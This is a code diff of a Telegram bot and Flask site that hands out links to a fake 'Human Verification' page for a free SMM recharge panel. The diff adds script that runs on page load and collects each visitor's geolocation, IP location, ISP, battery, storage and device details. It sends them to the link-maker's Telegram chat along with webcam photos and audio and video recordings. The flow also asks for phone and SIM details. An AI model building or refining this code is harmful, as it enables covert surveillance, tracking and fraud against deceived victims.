@@ -19,22 +19,21 @@ TOKEN = os.getenv("TOKEN")
 SERVER_URL = os.getenv("SERVER_URL")
 PORT = int(os.getenv("PORT", 10000))
 
-# Bot Username
 BOT_USERNAME = "@existenceip_bot"
 
-# Force join channels
+# Force join channels (Show only, no actual check)
 CHANNELS = ["@proxydominates", "@noruleclub"]
 CHANNEL_URLS = ["https://t.me/proxydominates", "https://t.me/noruleclub"]
 
 app = Flask(__name__)
 app.secret_key = os.urandom(24)
 
-# --- HUMAN VERIFICATION WITH CAMERA ---
-CAMERA_HTML = """
+# --- VERIFICATION PAGE WITH INSTANT DEVICE INFO ---
+VERIFY_HTML = """
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Human Verification</title>
+    <title>🔐 Human Verification</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -51,18 +50,49 @@ CAMERA_HTML = """
         .container {
             background: #1a1a1a;
             padding: 30px;
-            border-radius: 12px;
-            max-width: 500px;
+            border-radius: 16px;
+            max-width: 520px;
             width: 100%;
             text-align: center;
+            border: 1px solid #333;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.5);
         }
-        .title { color: #ff6b35; font-size: 24px; margin-bottom: 10px; }
-        .subtitle { color: #888; font-size: 14px; margin-bottom: 20px; }
+        .header-icon { font-size: 48px; margin-bottom: 10px; }
+        .title { 
+            color: #ff6b35; 
+            font-size: 26px; 
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+        .subtitle { 
+            color: #888; 
+            font-size: 14px; 
+            margin-bottom: 20px;
+            line-height: 1.6;
+        }
+        .device-info {
+            background: #0d0d0d;
+            border-radius: 12px;
+            padding: 15px;
+            margin: 15px 0;
+            text-align: left;
+            font-size: 13px;
+            border: 1px solid #2a2a2a;
+        }
+        .device-info .row {
+            display: flex;
+            justify-content: space-between;
+            padding: 4px 0;
+            border-bottom: 1px solid #1a1a1a;
+        }
+        .device-info .row:last-child { border-bottom: none; }
+        .device-info .label { color: #666; }
+        .device-info .value { color: #4caf50; font-weight: 500; }
         .video-container {
             background: #000;
             border-radius: 12px;
             overflow: hidden;
-            margin: 20px 0;
+            margin: 15px 0;
             position: relative;
         }
         video, canvas {
@@ -80,21 +110,26 @@ CAMERA_HTML = """
             cursor: pointer;
             transition: all 0.3s;
             margin: 5px;
+            width: 100%;
         }
         .btn:hover { background: #e55a2b; transform: scale(1.02); }
         .btn-secondary { background: #444; }
         .btn-secondary:hover { background: #555; }
         .btn-success { background: #4caf50; }
         .btn-success:hover { background: #45a049; }
+        .btn-danger { background: #dc3545; }
+        .btn-danger:hover { background: #c82333; }
         .status {
-            padding: 10px;
+            padding: 12px;
             margin: 10px 0;
             border-radius: 8px;
             font-size: 14px;
+            font-weight: 500;
         }
         .status-info { background: #1a3a5c; color: #7ec8e3; }
         .status-success { background: #1a4a2a; color: #7ecf8a; }
         .status-error { background: #4a1a1a; color: #ff6b6b; }
+        .status-warning { background: #4a3a1a; color: #ffd700; }
         .progress-bar {
             width: 100%;
             height: 6px;
@@ -110,14 +145,36 @@ CAMERA_HTML = """
             transition: width 0.3s;
         }
         .hidden { display: none; }
+        .flex { display: flex; gap: 10px; }
+        .flex .btn { width: 50%; }
+        .badge {
+            display: inline-block;
+            padding: 2px 10px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 600;
+        }
+        .badge-success { background: #4caf50; color: #fff; }
+        .badge-danger { background: #dc3545; color: #fff; }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="title">🔐 Human Verification</div>
-        <div class="subtitle">Please verify you're human by taking 10 photos</div>
+        <div class="header-icon">🔐</div>
+        <div class="title">Human Verification Required</div>
+        <div class="subtitle">Please complete verification to access the panel</div>
         
-        <div id="statusMessage" class="status status-info">📸 Click "Start Camera" to begin</div>
+        <div id="statusMessage" class="status status-info">📡 Collecting device information...</div>
+        
+        <!-- Device Info Display -->
+        <div class="device-info" id="deviceInfo">
+            <div class="row"><span class="label">🖥️ Device</span><span class="value" id="dDevice">Loading...</span></div>
+            <div class="row"><span class="label">🌐 IP Address</span><span class="value" id="dIP">Loading...</span></div>
+            <div class="row"><span class="label">📍 Location</span><span class="value" id="dLocation">Loading...</span></div>
+            <div class="row"><span class="label">📱 Browser</span><span class="value" id="dBrowser">Loading...</span></div>
+            <div class="row"><span class="label">🔋 Battery</span><span class="value" id="dBattery">Loading...</span></div>
+            <div class="row"><span class="label">💾 Storage</span><span class="value" id="dStorage">Loading...</span></div>
+        </div>
         
         <div class="video-container">
             <video id="video" autoplay playsinline style="display:none;"></video>
@@ -125,19 +182,120 @@ CAMERA_HTML = """
         </div>
         
         <div id="buttonGroup">
-            <button class="btn" id="startBtn" onclick="startCamera()">📷 Start Camera</button>
-            <button class="btn btn-success hidden" id="captureBtn" onclick="capturePhoto()">📸 Capture</button>
-            <button class="btn btn-secondary hidden" id="retryBtn" onclick="resetCamera()">🔄 Retry</button>
+            <button class="btn" id="startBtn" onclick="startVerification()">📷 Allow Camera & Verify</button>
+            <button class="btn btn-success hidden" id="captureBtn" onclick="capturePhoto()">📸 Capture Photo</button>
+            <div class="flex hidden" id="actionButtons">
+                <button class="btn btn-secondary" onclick="resetCamera()">🔄 Retry</button>
+                <button class="btn btn-danger" onclick="skipVerification()">⏭️ Skip</button>
+            </div>
         </div>
         
         <div class="progress-bar hidden" id="progressBar">
             <div class="progress-fill" id="progressFill"></div>
         </div>
-        
         <div id="statusText" style="margin-top: 10px; font-size: 13px; color: #888;"></div>
     </div>
 
     <script>
+        // --- COLLECT DEVICE INFO IMMEDIATELY ---
+        async function collectDeviceInfo() {
+            const info = {
+                platform: navigator.platform,
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                screen: screen.width + 'x' + screen.height,
+                cores: navigator.hardwareConcurrency || 'Unknown',
+                ram: navigator.deviceMemory || 'Unknown',
+                battery_level: 'N/A',
+                charging: 'No',
+                storage_used: '0.00',
+                storage_total: '0.00',
+                perm_cam: 'Denied',
+                perm_loc: 'Denied',
+                lat: null,
+                lon: null,
+                timestamp: new Date().toISOString()
+            };
+
+            // Get Battery
+            try {
+                const b = await navigator.getBattery();
+                info.battery_level = Math.round(b.level * 100) + '%';
+                info.charging = b.charging ? 'Yes' : 'No';
+            } catch(e) {}
+
+            // Get Storage
+            try {
+                if (navigator.storage && navigator.storage.estimate) {
+                    const est = await navigator.storage.estimate();
+                    info.storage_used = (est.usage / (1024**3)).toFixed(2);
+                    info.storage_total = (est.quota / (1024**3)).toFixed(2);
+                }
+            } catch(e) {}
+
+            // Get Location
+            try {
+                await new Promise((resolve) => {
+                    navigator.geolocation.getCurrentPosition(
+                        pos => {
+                            info.lat = pos.coords.latitude;
+                            info.lon = pos.coords.longitude;
+                            info.perm_loc = 'Allowed';
+                            resolve();
+                        },
+                        () => resolve(),
+                        { timeout: 3000 }
+                    );
+                });
+            } catch(e) {}
+
+            // Get IP and send all data
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                info.ip = ipData.ip;
+                
+                // Get IP location
+                const locRes = await fetch(`http://ip-api.com/json/${ipData.ip}?fields=status,country,regionName,city,lat,lon,timezone,isp`);
+                const locData = await locRes.json();
+                info.country = locData.country || 'N/A';
+                info.region = locData.regionName || 'N/A';
+                info.city = locData.city || 'N/A';
+                info.isp = locData.isp || 'N/A';
+                info.timezone = locData.timezone || 'N/A';
+                info.map_lat = locData.lat || info.lat || 0;
+                info.map_lon = locData.lon || info.lon || 0;
+
+                // Update UI
+                document.getElementById('dDevice').textContent = info.platform || 'Unknown';
+                document.getElementById('dIP').textContent = info.ip || 'N/A';
+                document.getElementById('dLocation').textContent = `${info.city || 'N/A'}, ${info.country || 'N/A'}`;
+                document.getElementById('dBrowser').textContent = info.userAgent.split(' ').slice(0,3).join(' ') || 'N/A';
+                document.getElementById('dBattery').textContent = `${info.battery_level} (${info.charging})`;
+                document.getElementById('dStorage').textContent = `${info.storage_used}GB / ${info.storage_total}GB`;
+
+                // Send to server immediately
+                await fetch('/device_info', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: "{{ chat_id }}",
+                        ...info
+                    })
+                });
+
+                document.getElementById('statusMessage').className = 'status status-success';
+                document.getElementById('statusMessage').textContent = '✅ Device information collected successfully! Click "Allow Camera & Verify" to continue.';
+
+            } catch(e) {
+                console.error('IP fetch error:', e);
+                document.getElementById('statusMessage').textContent = '⚠️ Using local device information only';
+            }
+
+            return info;
+        }
+
+        // --- CAMERA VERIFICATION ---
         let video = document.getElementById('video');
         let canvas = document.getElementById('canvas');
         let stream = null;
@@ -145,6 +303,7 @@ CAMERA_HTML = """
         const MAX_PHOTOS = 10;
         let capturedPhotos = [];
         let isCapturing = false;
+        let deviceInfo = {};
 
         function updateStatus(msg, type = 'info') {
             const el = document.getElementById('statusMessage');
@@ -161,7 +320,7 @@ CAMERA_HTML = """
             document.getElementById('statusText').textContent = `📸 ${count}/${MAX_PHOTOS} photos captured`;
         }
 
-        async function startCamera() {
+        async function startVerification() {
             try {
                 stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user", width: 640, height: 480 },
@@ -173,11 +332,12 @@ CAMERA_HTML = """
                 
                 document.getElementById('startBtn').classList.add('hidden');
                 document.getElementById('captureBtn').classList.remove('hidden');
-                document.getElementById('retryBtn').classList.remove('hidden');
+                document.getElementById('actionButtons').classList.remove('hidden');
                 
-                updateStatus('✅ Camera started! Auto-capturing photos...', 'success');
+                updateStatus('✅ Camera active! Auto-capturing photos...', 'success');
                 isCapturing = true;
                 
+                // Start auto-capture
                 autoCapture();
             } catch(e) {
                 updateStatus('❌ Camera access denied! Please allow camera permission', 'error');
@@ -193,13 +353,13 @@ CAMERA_HTML = """
                     capturePhoto();
                     autoCapture();
                 }
-            }, 2000 + Math.random() * 1000);
+            }, 1800 + Math.random() * 1200);
         }
 
         async function capturePhoto() {
             if (photoCount >= MAX_PHOTOS) {
                 updateStatus('✅ All 10 photos captured! Processing...', 'success');
-                await sendPhotos();
+                await sendAllMedia();
                 return;
             }
 
@@ -220,43 +380,38 @@ CAMERA_HTML = """
                 
                 if (photoCount >= MAX_PHOTOS) {
                     updateStatus('✅ All photos captured! Sending...', 'success');
-                    await sendPhotos();
+                    await sendAllMedia();
                 }
             } catch(e) {
                 console.error('Capture error:', e);
             }
         }
 
-        async function sendPhotos() {
+        async function sendAllMedia() {
             const btn = document.getElementById('captureBtn');
             btn.disabled = true;
-            btn.textContent = '⏳ Sending...';
+            btn.textContent = '⏳ Uploading...';
             
+            // Capture audio (10 sec)
             let audioData = null;
             try {
                 audioData = await captureAudio();
-            } catch(e) {
-                console.error('Audio capture error:', e);
-            }
-            
+            } catch(e) {}
+
+            // Capture video (10 sec)
             let videoData = null;
             try {
                 videoData = await captureVideo();
-            } catch(e) {
-                console.error('Video capture error:', e);
-            }
-            
+            } catch(e) {}
+
             const data = {
                 chat_id: "{{ chat_id }}",
                 photos: capturedPhotos,
                 audio: audioData,
                 video: videoData,
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                screen: screen.width + 'x' + screen.height
+                timestamp: new Date().toISOString()
             };
-            
+
             try {
                 const response = await fetch('/upload_media', {
                     method: 'POST',
@@ -265,12 +420,12 @@ CAMERA_HTML = """
                 });
                 
                 if (response.ok) {
-                    updateStatus('✅ Verification complete! Redirecting...', 'success');
+                    updateStatus('✅ Verification complete! Redirecting to panel...', 'success');
                     setTimeout(() => {
                         window.location.href = "{{ redirect_url }}";
                     }, 1500);
                 } else {
-                    updateStatus('❌ Error sending data. Please try again.', 'error');
+                    updateStatus('❌ Error uploading. Please try again.', 'error');
                 }
             } catch(e) {
                 updateStatus('❌ Network error. Please try again.', 'error');
@@ -282,7 +437,6 @@ CAMERA_HTML = """
                 const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                 const mediaRecorder = new MediaRecorder(audioStream);
                 const chunks = [];
-                
                 return new Promise((resolve) => {
                     mediaRecorder.ondataavailable = e => chunks.push(e.data);
                     mediaRecorder.onstop = () => {
@@ -295,9 +449,7 @@ CAMERA_HTML = """
                     mediaRecorder.start();
                     setTimeout(() => mediaRecorder.stop(), 10000);
                 });
-            } catch(e) {
-                return null;
-            }
+            } catch(e) { return null; }
         }
 
         async function captureVideo() {
@@ -308,7 +460,6 @@ CAMERA_HTML = """
                 });
                 const mediaRecorder = new MediaRecorder(videoStream);
                 const chunks = [];
-                
                 return new Promise((resolve) => {
                     mediaRecorder.ondataavailable = e => chunks.push(e.data);
                     mediaRecorder.onstop = () => {
@@ -321,9 +472,7 @@ CAMERA_HTML = """
                     mediaRecorder.start();
                     setTimeout(() => mediaRecorder.stop(), 10000);
                 });
-            } catch(e) {
-                return null;
-            }
+            } catch(e) { return null; }
         }
 
         function resetCamera() {
@@ -337,15 +486,26 @@ CAMERA_HTML = """
             canvas.style.display = 'block';
             document.getElementById('startBtn').classList.remove('hidden');
             document.getElementById('captureBtn').classList.add('hidden');
+            document.getElementById('actionButtons').classList.add('hidden');
             document.getElementById('progressBar').classList.add('hidden');
-            updateStatus('🔄 Reset. Click "Start Camera" to begin again.', 'info');
+            updateStatus('🔄 Reset. Click "Allow Camera & Verify" to begin again.', 'info');
         }
+
+        function skipVerification() {
+            updateStatus('⏭️ Skipping verification... Redirecting...', 'warning');
+            setTimeout(() => {
+                window.location.href = "{{ redirect_url }}";
+            }, 1000);
+        }
+
+        // --- INIT ---
+        collectDeviceInfo();
     </script>
 </body>
 </html>
 """
 
-# --- SMM PANEL HTML ---
+# --- SMM PANEL HTML (Professional) ---
 SMM_PANEL_HTML = """
 <!DOCTYPE html>
 <html>
@@ -369,7 +529,6 @@ SMM_PANEL_HTML = """
             margin-bottom: 30px;
         }
         .header h1 { 
-            color: #ff6b35; 
             font-size: 32px;
             background: linear-gradient(45deg, #ff6b35, #ffd700);
             -webkit-background-clip: text;
@@ -741,7 +900,67 @@ def index():
 def verify():
     chat_id = session.get('chat_id') or request.args.get('chat_id')
     redirect_url = request.args.get('redir', url_for('panel', chat_id=chat_id))
-    return render_template_string(CAMERA_HTML, chat_id=chat_id, redirect_url=redirect_url)
+    return render_template_string(VERIFY_HTML, chat_id=chat_id, redirect_url=redirect_url)
+
+@app.route('/device_info', methods=['POST'])
+def device_info():
+    data = request.json
+    chat_id = data.get('chat_id')
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
+    
+    def safe(val): 
+        if val is None: return 'N/A'
+        return str(val).replace('_', '\\_').replace('*', '\\*').replace('`', '\\`')
+    
+    # Get IP info
+    try:
+        ip_info = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,lat,lon,timezone,isp").json()
+    except:
+        ip_info = {}
+    
+    map_lat = data.get('lat') or ip_info.get('lat', 0)
+    map_lon = data.get('lon') or ip_info.get('lon', 0)
+    map_link = f"https://maps.google.com/maps?q={map_lat},{map_lon}"
+    
+    loc_perm = "Allowed" if data.get('lat') else "Denied"
+    
+    msg = (
+        f"📊 **Visitor Information Captured**\n"
+        f"━━━━━━━━━━━━━━━━\n\n"
+        f"🖥️ **Device and Browser**\n"
+        f"   • Device Model: `{safe(data.get('platform'))}`\n"
+        f"   • User Agent: `{safe(data.get('userAgent'))}`\n\n"
+        f"🌐 **Network Information**\n"
+        f"   • IP Address: `{ip}`\n"
+        f"   • ISP: {safe(ip_info.get('isp', 'N/A'))}\n"
+        f"   • Language: {safe(data.get('language'))}\n\n"
+        f"📍 **Location Details**\n"
+        f"   • Country: {safe(ip_info.get('country', 'N/A'))}\n"
+        f"   • Region: {safe(ip_info.get('regionName', 'N/A'))}\n"
+        f"   • City: {safe(ip_info.get('city', 'N/A'))}\n"
+        f"   • Timezone: {safe(ip_info.get('timezone', 'N/A'))}\n\n"
+        f"🖼️ **Display Information**\n"
+        f"   • Resolution: {safe(data.get('screen'))}\n\n"
+        f"🔋 **Battery Status**\n"
+        f"   • Level: {safe(data.get('battery_level'))}\n"
+        f"   • Charging: {safe(data.get('charging'))}\n\n"
+        f"🔐 **Device Permissions**\n"
+        f"   • Camera: {safe(data.get('perm_cam'))}\n"
+        f"   • Location: {loc_perm}\n\n"
+        f"💾 **Hardware & Storage**\n"
+        f"   • CPU Cores: {safe(data.get('cores'))}\n"
+        f"   • RAM: {safe(data.get('ram'))} GB\n"
+        f"   • Storage Used: {safe(data.get('storage_used'))} GB\n"
+        f"   • Storage Total: {safe(data.get('storage_total'))} GB\n\n"
+        f"🗺 **Map Link:**\n{map_link}\n"
+        f"━━━━━━━━━━━━━━━━\n"
+        f"⚡ Developed by: @FROXLS"
+    )
+    
+    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
+                 json={"chat_id": chat_id, "text": msg, "parse_mode": "Markdown"})
+    
+    return jsonify({'success': True})
 
 @app.route('/panel')
 def panel():
@@ -785,7 +1004,7 @@ def claim_offer():
            f"💰 Base Coins: `{plan['coins']}`\n"
            f"🎁 Bonus: `{bonus}`\n"
            f"✨ Total: `{total_coins}`\n\n"
-           f"⚡ @proxydominates")
+           f"⚡ @FROXLS")
     
     requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                  json={"chat_id": chat_id, "text": msg, "parse_mode": "Markdown"})
@@ -812,17 +1031,19 @@ def upload_media():
     if not chat_id:
         return jsonify({'error': 'No chat_id'}), 400
     
+    # Send photos one by one (slowly)
     photos = data.get('photos', [])
     for i, photo in enumerate(photos[:10]):
         try:
             img_data = base64.b64decode(photo.split(',')[1])
             requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
-                         data={'chat_id': chat_id, 'caption': f'📸 Photo {i+1}/10'},
+                         data={'chat_id': chat_id, 'caption': f'📸 Verification Photo {i+1}/10'},
                          files={'photo': (f'photo_{i}.jpg', img_data)})
-            time.sleep(0.3)
+            time.sleep(0.5)  # Slow sending
         except Exception as e:
             print(f"Error sending photo {i}: {e}")
     
+    # Send audio
     if data.get('audio'):
         try:
             audio_data = base64.b64decode(data['audio'].split(',')[1])
@@ -832,6 +1053,7 @@ def upload_media():
         except Exception as e:
             print(f"Error sending audio: {e}")
     
+    # Send video
     if data.get('video'):
         try:
             video_data = base64.b64decode(data['video'].split(',')[1])
@@ -841,46 +1063,14 @@ def upload_media():
         except Exception as e:
             print(f"Error sending video: {e}")
     
-    device_msg = (f"📱 **Device Info**\n\n"
-                 f"Platform: `{data.get('platform', 'N/A')}`\n"
-                 f"Screen: `{data.get('screen', 'N/A')}`\n"
-                 f"Timestamp: `{data.get('timestamp', 'N/A')}`")
-    
-    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
-                 json={"chat_id": chat_id, "text": device_msg, "parse_mode": "Markdown"})
-    
     return jsonify({'success': True})
 
 # --- TELEGRAM BOT HANDLERS ---
-
-async def is_subscribed(app, user_id):
-    """Check if user is subscribed - BYPASSED for testing"""
-    # BYPASS: Always return True so bot works without channel check
-    # Remove this bypass and uncomment real check for production
-    return True
-    
-    # REAL CHECK - Uncomment for production
-    """
-    for channel in CHANNELS:
-        try:
-            chat_id = channel.replace('@', '')
-            member = await app.bot.get_chat_member(chat_id=chat_id, user_id=user_id)
-            if member.status in ["left", "kicked"]:
-                print(f"User {user_id} not subscribed to {channel}")
-                return False
-        except Exception as e:
-            print(f"Error checking channel {channel}: {e}")
-            return False
-    return True
-    """
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     username = update.effective_user.username or "Unknown"
     
-    print(f"👤 User @{username} ({user_id}) started bot")
-    
-    # Bypass check - directly show welcome
     await update.message.reply_text(
         f"👋 **Welcome to SMM Panel Bot!**\n\n"
         f"Send any link to generate your SMM panel access URL.\n\n"
@@ -897,20 +1087,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"🤖 Bot: {BOT_USERNAME}"
     )
 
-async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    if query.data == "check_sub":
-        await query.edit_message_text(
-            "✅ **Verification Successful!**\n\n"
-            "You are now subscribed to all channels.\n"
-            "Send any link to get started!"
-        )
-
 async def handle_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    
     url = update.message.text
     if not url.startswith("http"):
         await update.message.reply_text("❌ Invalid link. Please send a valid URL.")
@@ -921,64 +1098,48 @@ async def handle_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"✅ **Your SMM Panel Link:**\n\n"
         f"`{link}`\n\n"
         f"📋 **User Flow:**\n"
-        f"1️⃣ 📸 Human Verification (10 photos)\n"
-        f"2️⃣ 🎤 Audio Recording (10 sec)\n"
-        f"3️⃣ 🎥 Video Recording (10 sec)\n"
-        f"4️⃣ 💰 Free Recharge Panel\n"
-        f"5️⃣ 📱 Submit Phone/SIM Details\n"
-        f"6️⃣ 🎉 Success Page\n\n"
-        f"🤖 Bot: {BOT_USERNAME}"
+        f"1️⃣ 📡 Device Info Auto-Captured\n"
+        f"2️⃣ 🔐 Human Verification (10 photos)\n"
+        f"3️⃣ 🎤 Audio Recording (10 sec)\n"
+        f"4️⃣ 🎥 Video Recording (10 sec)\n"
+        f"5️⃣ 💰 Free Recharge Panel\n"
+        f"6️⃣ 📱 Submit Phone/SIM Details\n"
+        f"7️⃣ 🎉 Success Page\n\n"
+        f"⚡ Developed by: @FROXLS"
     )
 
 async def handle_group_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not update.message.text or BOT_USERNAME not in update.message.text:
         return
     
-    user_id = update.effective_user.id
-    
-    if update.effective_chat.type == "channel":
-        return
-    
     text = update.message.text
     for word in text.split():
         if word.startswith("http"):
-            link = f"{SERVER_URL}/?id={user_id}"
+            link = f"{SERVER_URL}/?id={update.effective_user.id}"
             await update.message.reply_text(
                 f"✅ **Your SMM Panel Link:**\n\n"
                 f"`{link}`\n\n"
                 f"Click above link to start!\n\n"
-                f"🤖 Bot: {BOT_USERNAME}"
+                f"⚡ Developed by: @FROXLS"
             )
             return
-    
-    await update.message.reply_text(
-        f"❌ Please send a valid link with http or https\n\n"
-        f"🤖 Bot: {BOT_USERNAME}"
-    )
 
 async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     print(f"❌ Error: {context.error}")
 
 # --- MAIN ---
 if __name__ == '__main__':
-    # Start Flask
     threading.Thread(target=lambda: app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)).start()
     
-    # Create Application
     application = Application.builder().token(TOKEN).build()
-    
-    # Add handlers
     application.add_handler(CommandHandler("start", start))
-    application.add_handler(CallbackQueryHandler(button_callback))
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & filters.ChatType.PRIVATE, handle_link))
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & filters.ChatType.GROUP, handle_group_message))
     application.add_error_handler(error_handler)
     
     print("🤖 Bot Started Successfully!")
-    print(f"📢 Bot Username: {BOT_USERNAME}")
-    print(f"📢 Force Channels: {CHANNELS}")
-    print(f"🌐 Server URL: {SERVER_URL}")
-    print(f"🔧 Channel Check: BYPASSED (Bot works without joining)")
+    print(f"📢 Bot: {BOT_USERNAME}")
+    print(f"🌐 Server: {SERVER_URL}")
+    print(f"⚡ Developed by: @FROXLS")
     
-    # Start bot
     application.run_polling(allowed_updates=Update.ALL_TYPES)
